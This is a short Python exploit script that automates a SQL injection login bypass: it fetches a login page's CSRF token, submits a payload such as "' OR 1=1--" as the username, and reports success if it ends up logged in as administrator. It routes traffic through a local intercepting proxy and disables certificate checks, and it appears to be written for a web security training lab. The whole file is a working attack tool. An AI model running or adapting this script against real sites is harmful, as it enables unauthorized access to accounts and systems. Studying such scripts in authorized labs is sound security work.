from requests_html import HTMLSession
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}



def get_csrf_token(session, url):
    req = session.get(url, verify=False, proxies=proxies)
    res = req.html
    csrf_token = res.find("input", first=True).attrs['value']
    return csrf_token


def exploit_sqli(session, url, payload):
    csrf_token = get_csrf_token(session, url)
    data = {
        "csrf": csrf_token,
        "username": payload,
        "password": "password"
        
    }
    r = session.post(url, data=data, verify=False, proxies=proxies)
    if "Log out" in r.text:
        return True
    return False


if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print(f'[-] Usage: python3 {sys.argv[0]} <url> <payload>')
        print(f'[-] Example: python3 {sys.argv[0]} http://example.com "\' OR 1=1--"')
        sys.exit(1)
    
    session = HTMLSession()
    if exploit_sqli(session, url, payload):
        print("[+] SQL Injection Vulnerability has been exploited and you're Logged in as Administrator!")
    else:
        print("[-] Failed To exploit the SQL Injection vulnerability!")